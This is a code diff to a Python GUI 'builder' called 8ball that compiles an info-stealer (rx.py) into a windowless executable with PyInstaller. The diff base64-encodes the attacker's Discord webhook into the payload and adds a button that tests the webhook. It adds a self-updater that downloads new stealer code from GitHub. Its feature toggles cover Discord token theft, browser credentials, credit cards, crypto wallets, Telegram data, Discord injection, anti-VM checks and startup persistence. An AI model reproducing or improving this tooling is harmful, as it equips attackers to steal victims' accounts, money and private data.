@@ -1,24 +1,28 @@
 import os
+import sys
+import json
 import shutil
 import webbrowser
 import random
 import re
 import subprocess
 import urllib.request
+import threading
 from tkinter import filedialog, messagebox
 import customtkinter as ctk
 from tkinter import ttk
 # --- INITIAL SETUP ---
-PROJECT_DIR = "Build_Project"
-FILE_NAME = 'rx.py'
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+PROJECT_DIR = os.path.join(SCRIPT_DIR, "Build_Project")
+FILE_NAME = os.path.join(PROJECT_DIR, 'rx.py')
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("blue") 
 
 if not os.path.exists(PROJECT_DIR):
     os.makedirs(PROJECT_DIR)
-if os.path.exists(FILE_NAME) and not os.path.exists(os.path.join(PROJECT_DIR, FILE_NAME)):
-    shutil.move(FILE_NAME, os.path.join(PROJECT_DIR, FILE_NAME))
-os.chdir(PROJECT_DIR)
+script_rx = os.path.join(SCRIPT_DIR, 'rx.py')
+if os.path.exists(script_rx) and not os.path.exists(FILE_NAME):
+    shutil.move(script_rx, FILE_NAME)
 
 # --- THEME COLORS ---
 LOGOCOLOR = "#ffffff"
@@ -49,21 +53,25 @@ def download_online_stub():
         messagebox.showerror("Download Error", f"Failed to download stub:\n{e}")
         return False
 def validate_webhook(webhook):
-    return 'api/webhooks' in webhook
+    return webhook and 'api/webhooks' in webhook
 
 def replace_webhook(webhook):
     if not os.path.exists(FILE_NAME):
         messagebox.showerror("Error", f"{FILE_NAME} not found!")
         return False
 
+    webhook = webhook.strip()
+    import base64
+    b64 = base64.b64encode(webhook.encode()).decode()
+
     with open(FILE_NAME, 'r', encoding='utf-8') as file:
         lines = file.readlines()
 
     with open(FILE_NAME, 'w', encoding='utf-8') as file:
         for line in lines:
-            if line.strip().startswith('h00k ='):
+            if line.strip().startswith('_HOOK_B64 ='):
                 indent = ' ' * (len(line) - len(line.lstrip()))
-                file.write(f'{indent}h00k = "{webhook}"\n')
+                file.write(f'{indent}_HOOK_B64 = "{b64}"\n')
             else:
                 file.write(line)
     return True
@@ -112,7 +120,7 @@ def update_feature_config(selected_features: list[str]) -> bool:
     # IMPORTANT: these labels MUST match the checkbox labels in the GUI (features dict) exactly
     feature_map = {
         "Discord Token Stealer": "discord_tokens",
-        "Browser Data Extractor": "browser_data",
+        "Browser Credentials": "browser_credentials",
         "Local Files": "file_search",
         "Discord JavaScript Injection": "discord_injection",
         "Anti-Debugging/VM": "anti_debug",
@@ -122,16 +130,19 @@ def update_feature_config(selected_features: list[str]) -> bool:
         "Discord Gift Codes": "discord_gift_codes",
         "Crypto Wallet": "wallet_gaming_data",
         "Telegram": "telegram_desktop",
-        "Browser Autofill and History": "browser_autofill_history",
-        "Browser Bookmarks": "browser_bookmarks",
-        "Credit Cards": "browser_credit_cards",
+        "Debug Mode": "debug_mode",
         "Startup Persistence": "startup_persistence",
     }
+    browser_sub_features = ["browser_autofill_history", "browser_bookmarks", "browser_credit_cards"]
 
     # Build a dict of FEATURE_CONFIG booleans
     config = {}
     for label, key in feature_map.items():
         config[key] = label in selected_features
+    # When Browser Credentials is selected, enable all browser sub-features
+    if config.get("browser_credentials"):
+        for sub_key in browser_sub_features:
+            config[sub_key] = True
 
     # Serialize into Python dict literal on one line
     config_literal = "{\n"
@@ -165,48 +176,28 @@ def update_feature_config(selected_features: list[str]) -> bool:
 
     return True
 
-def check_build_done(proc):
-    # Poll the process; when it's done, update status
-    if proc.poll() is None:
-        # still running, check again shortly
-        app.after(500, lambda: check_build_done(proc))
-    else:
-        if proc.returncode == 0:
-            status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981")
-            messagebox.showinfo("Build Finished", "Build completed successfully.")
-        else:
-            status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444")
-            messagebox.showerror("Build Failed", f"Build process exited with code {proc.returncode}.")
-
 def build_exe():
-    webhook = entry.get()
+    webhook = entry.get().strip()
     if not validate_webhook(webhook):
-        messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook.")
+        messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook URL.")
         return
 
-    # Ensure at least one feature is selected
     selected_features = [name for name, var in features.items() if var.get()]
     if not selected_features:
-        messagebox.showerror(
-            "No Features Selected",
-            "No features selected.\nBuild aborted."
-        )
+        messagebox.showerror("No Features Selected", "No features selected.\nBuild aborted.")
         return
 
-    print("[RX Builder] Selected features:", ", ".join(selected_features))
+    terminal_write("[8Ball] Selected features: " + ", ".join(selected_features) + "\n")
 
-    # Download online stub if SRC_URL is set in rx.py
     if not download_online_stub():
         return
 
-    # Update webhook and FEATURE_CONFIG in rx.py before building
     if not replace_webhook(webhook):
         return
 
     if not update_feature_config(selected_features):
         return
 
-    # Write Telegram and Ping config
     tg_token = tg_entry.get().strip()
     tg_chat = tg_chat_entry.get().strip()
     update_feature_config_string("telegram_bot_token", tg_token)
@@ -227,36 +218,120 @@ def build_exe():
     with open(FILE_NAME, "w", encoding="utf-8") as f:
         f.write(src)
 
-    # Icon option (optional)
     icon_option = ""
     if check_var.get() == "on":
         icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
         if icon_path:
             icon_option = f' --icon="{icon_path}"'
 
-    status_label.configure(text="STATUS: BUILDING...", text_color=STATUS)
-    app.update()
-# Run pyinstaller in a separate console, close it when done
-    cmd = f'pyinstaller --noconsole --onefile --clean --noconfirm{icon_option} {FILE_NAME}'
-    try:
-        proc = subprocess.Popen(
-            ["cmd.exe", "/c", cmd],  # /c = run then close
-            creationflags=subprocess.CREATE_NEW_CONSOLE
-        )
-    except Exception as e:
-        messagebox.showerror("Build Error", f"Failed to start build terminal:\n{e}")
-        status_label.configure(text="STATUS: ERROR", text_color="#ef4444")
-        return
+    console_flag = "--noconsole"  # Debug logs go to Discord embed, not console
+    # Remove stale spec file so PyInstaller regenerates with correct flags
+    spec_path = os.path.join(PROJECT_DIR, FILE_NAME.replace(".py", ".spec"))
+    if os.path.exists(spec_path):
+        os.remove(spec_path)
+    cmd = f'"{sys.executable}" -m PyInstaller {console_flag} --onefile --clean --noconfirm{icon_option} "{FILE_NAME}"'
+    terminal_write(f"[8Ball] Starting build: {cmd}\n")
 
-    # Optionally wait for completion and then update status
-    app.after(100, lambda: check_build_done(proc))
+    def run_build():
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+                cwd=PROJECT_DIR,
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+            )
+        except Exception as e:
+            terminal_write(f"[8Ball] ERROR: Failed to start build: {e}\n")
+            app.after(0, lambda: status_label.configure(text="STATUS: ERROR", text_color="#ef4444"))
+            return
+
+        for line in iter(proc.stdout.readline, ""):
+            if not line:
+                break
+            terminal_write(line)
+
+        proc.stdout.close()
+        proc.wait()
+
+        if proc.returncode == 0:
+            app.after(0, lambda: status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981"))
+            terminal_write("[8Ball] Build completed successfully.\n")
+            app.after(0, lambda: messagebox.showinfo("Build Finished", "Build completed successfully."))
+        else:
+            app.after(0, lambda: status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444"))
+            terminal_write(f"[8Ball] Build failed with exit code {proc.returncode}.\n")
+            app.after(0, lambda: messagebox.showerror("Build Failed",
+                f"Build process exited with code {proc.returncode}.\n\nCheck the build output terminal for details."))
+
+    terminal_write("[8Ball] Config written. Starting PyInstaller...\n")
+    app.after(0, lambda: status_label.configure(text="STATUS: BUILDING...", text_color=STATUS))
+    threading.Thread(target=run_build, daemon=True).start()
+def test_webhook():
+    webhook = entry.get().strip()
+    if not validate_webhook(webhook):
+        messagebox.showerror("Test Failed", "Please provide a valid Discord Webhook URL.")
+        return
+    webhook = webhook.strip()
+    try:
+        payload = {"content": "Webhook test from 8Ball Builder - connection OK!"}
+        data = json.dumps(payload).encode()
+        req = urllib.request.Request(webhook, data=data, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
+        urllib.request.urlopen(req, timeout=15)
+        messagebox.showinfo("Test Successful", "Webhook is valid and message sent successfully.")
+    except Exception as e:
+        messagebox.showerror("Test Failed", f"Failed to send test message:\n{e}")
+
 def open_link(url):
     webbrowser.open(url)
+
+# --- UPDATE CHECK ---
+LOCAL_VERSION = "2.0.0"
+VERSION_URL = "https://raw.githubusercontent.com/Lux00001/8Ball/main/version.json"
+
+def version_tuple(v):
+    return tuple(int(x) for x in v.split("."))
+
+def check_for_updates():
+    try:
+        req = urllib.request.Request(VERSION_URL, headers={"User-Agent": "Mozilla/5.0"})
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read().decode())
+        remote = data.get("version", "")
+        if remote and version_tuple(remote) > version_tuple(LOCAL_VERSION):
+            app.after(0, lambda: _apply_update(data, remote))
+    except Exception:
+        pass
+
+def _apply_update(data, remote):
+    if not messagebox.askyesno("Update Available", f"Version {remote} is available.\nDownload and update now?"):
+        return
+    remote_files = data.get("files", {})
+    base = os.path.dirname(os.path.abspath(__file__))
+    mappings = {
+        "rx.py": os.path.join(base, "Build_Project", "rx.py"),
+        "builder.pyw": os.path.join(base, "builder.pyw"),
+    }
+    try:
+        for key, url in remote_files.items():
+            path = mappings.get(key)
+            if not path:
+                continue
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            resp = urllib.request.urlopen(req, timeout=30)
+            with open(path, "wb") as f:
+                f.write(resp.read())
+        messagebox.showinfo("Update Complete", f"Updated to v{remote}. Please restart the builder.")
+        app.destroy()
+    except Exception as e:
+        messagebox.showerror("Update Failed", f"Could not download update:\n{e}")
 
 # --- GUI LAYOUT ---
 app = ctk.CTk()
 app.title("8ball v2.0 | ALPHA")
-app.geometry("650x640")
+app.geometry("680x720")
 app.configure(fg_color=BG_COLOR)
 app.resizable(False, False)
 
@@ -318,9 +393,15 @@ desc.pack(anchor="w", pady=(0, 25))
 
 entry_label = ctk.CTkLabel(content1, text="DISCORD WEBHOOK URL", font=("Arial Bold", 11), text_color=ACCENT_BLUE)
 entry_label.pack(anchor="w", pady=(10, 5))
-entry = ctk.CTkEntry(content1, width=380, height=45, placeholder_text="Paste your webhook here...", 
+entry_frame = ctk.CTkFrame(content1, fg_color="transparent")
+entry_frame.pack(anchor="w")
+entry = ctk.CTkEntry(entry_frame, width=340, height=45, placeholder_text="Paste your webhook here...", 
                      fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
-entry.pack(anchor="w")
+entry.pack(side="left")
+test_btn = ctk.CTkButton(entry_frame, text="Test", width=60, height=45, corner_radius=8,
+                         font=("Arial Bold", 12), fg_color=ACCENT_BLUE, hover_color="#4AA9F7",
+                         command=lambda: test_webhook())
+test_btn.pack(side="left", padx=(6, 0))
 
 check_var = ctk.StringVar(value="off")
 checkbox = ctk.CTkCheckBox(content1, text="Add Custom Icon (.ico)", variable=check_var, 
@@ -355,6 +436,26 @@ button.pack(side="left")
 status_label = ctk.CTkLabel(btn_frame, text="STATUS: READY", font=("Arial Bold", 10), text_color=TEXT_SUB)
 status_label.pack(side="right", padx=10)
 
+# Terminal / Console output area
+terminal_frame = ctk.CTkFrame(content1, fg_color="#0c0c12", corner_radius=6)
+terminal_frame.pack(fill="both", expand=True, pady=(10, 0))
+terminal_header = ctk.CTkLabel(terminal_frame, text=" BUILD OUTPUT", font=("Consolas", 9, "bold"), text_color="#888888", anchor="w")
+terminal_header.pack(fill="x", padx=6, pady=(4, 0))
+terminal = ctk.CTkTextbox(
+    terminal_frame, height=160, fg_color="#0c0c12", text_color="#d4d4d4",
+    font=("Consolas", 10), wrap="word", border_spacing=4, state="disabled"
+)
+terminal.pack(fill="both", expand=True, padx=4, pady=(0, 4))
+
+def terminal_write(msg):
+    """Thread-safe append to the terminal textbox."""
+    def _append():
+        terminal.configure(state="normal")
+        terminal.insert("end", msg)
+        terminal.see("end")
+        terminal.configure(state="disabled")
+    app.after(0, _append)
+
 # Feature Selection Panel Content with scrollable area
 feature_label = ctk.CTkLabel(content2, text="Select Features", font=("Arial Bold", 14), text_color="white")
 feature_label.pack(anchor="w", pady=(0, 10))
@@ -386,7 +487,7 @@ feature_canvas.bind_all("<MouseWheel>", _on_mousewheel)
 
 features = {
     "Discord Token Stealer": ctk.BooleanVar(value=False),
-    "Browser Data Extractor": ctk.BooleanVar(value=False),
+    "Browser Credentials": ctk.BooleanVar(value=False),
     "Local Files": ctk.BooleanVar(value=False),
     "Discord JavaScript Injection": ctk.BooleanVar(value=False),
     "Anti-Debugging/VM": ctk.BooleanVar(value=False),
@@ -396,9 +497,7 @@ features = {
     "Discord Gift Codes": ctk.BooleanVar(value=False),
     "Crypto Wallet": ctk.BooleanVar(value=False),     
     "Telegram": ctk.BooleanVar(value=False),
-    "Browser Autofill and History": ctk.BooleanVar(value=False),
-    "Browser Bookmarks": ctk.BooleanVar(value=False),
-    "Credit Cards": ctk.BooleanVar(value=False),
+    "Debug Mode": ctk.BooleanVar(value=False),
     "Startup Persistence": ctk.BooleanVar(value=False),
 }
 
@@ -411,5 +510,8 @@ for feature, var in features.items():
         offvalue=False,
         font=("Arial", 12)
     ).pack(anchor="w", pady=5)
+
+# Check for updates on startup (non-blocking thread)
+threading.Thread(target=check_for_updates, daemon=True).start()
 
 app.mainloop()
